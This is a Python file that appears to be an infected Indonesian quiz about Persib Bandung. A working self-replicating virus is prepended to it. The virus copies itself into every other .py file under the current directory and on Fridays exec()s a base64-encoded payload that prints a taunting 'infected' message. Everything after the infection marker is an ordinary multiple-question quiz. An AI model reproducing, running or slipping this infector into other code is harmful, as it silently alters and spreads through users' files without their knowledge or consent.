# VIRUS SAYS HI!

import os
import base64
import datetime

VIRUS_SIGNATURE = "# ~infected_by_complex_virus~"

def get_virus_code():
    virus_code = []
    in_virus = False
    with open(__file__, 'r') as f:
        for line in f:
            if line.strip() == "# VIRUS SAYS HI!":
                in_virus = True
            if in_virus:
                virus_code.append(line)
            if line.strip() == "# VIRUS SAYS BYE!":
                break
    return virus_code

def find_python_files(path="."):
    files = []
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            if f.endswith(".py") and f != os.path.basename(__file__):
                files.append(os.path.join(dirpath, f))
    return files

def infect_files(virus_code):
    for file in find_python_files():
        with open(file, "r") as f:
            if VIRUS_SIGNATURE in f.read():
                continue
        with open(file, "r") as f:
            original = f.read()
        with open(file, "w") as f:
            f.writelines(virus_code)
            f.write("\n" + VIRUS_SIGNATURE + "\n")
            f.write(original)

def run_payload():
    if datetime.datetime.today().weekday() == 4:  # Friday
        payload = base64.b64decode("cHJpbnQoIllPVSBIQVZFIEJFRU4gSU5GRUNURUQgSEFISEFIQSEhICEiKQ==")
        exec(payload.decode())

if __name__ == "__main__":
    virus = get_virus_code()
    infect_files(virus)
    run_payload()

# VIRUS SAYS BYE!

# ~infected_by_complex_virus~
print("=== Kuis Interaktif Persib Bandung ===")

score = 0

# Pertanyaan 1
jawab1 = input("1. Apa nama stadion kandang Persib Bandung? ").strip().lower()
if "gelora bandung lautan api" in jawab1 or "gbla" in jawab1:
    score += 1

# Pertanyaan 2
jawab2 = input("2. Apa julukan Persib Bandung? ").strip().lower()
if "maung bandung" in jawab2:
    score += 1

# Pertanyaan 3
jawab3 = input("3. Siapa pelatih Persib Bandung saat ini? ").strip().lower()
if "bojan hodak" in jawab3:
    score += 1

# Pertanyaan 4
jawab4 = input("4. Sudah berapa kali Persib Bandung juara di Liga 1 Indonesia? ").strip().lower()
if jawab4 == "4":
    score += 1

# Pertanyaan 5
jawab5 = input("5. Siapa pemain legendaris Persib yang dikenal dengan julukan 'Si Gelandang Tangguh'? ").strip().lower()
if "robbie gaspar" in jawab5 or "robbie" in jawab5:
    score += 1

print(f"\nSkor kamu: {score}/5")

if score == 5:
    print("Hebat! Kamu bobotoh sejati!")
elif score >= 3:
    print("Bagus! Kamu cukup tahu tentang Persib.")
else:
    print("Yuk kenali Persib Bandung lebih dalam lagi.")
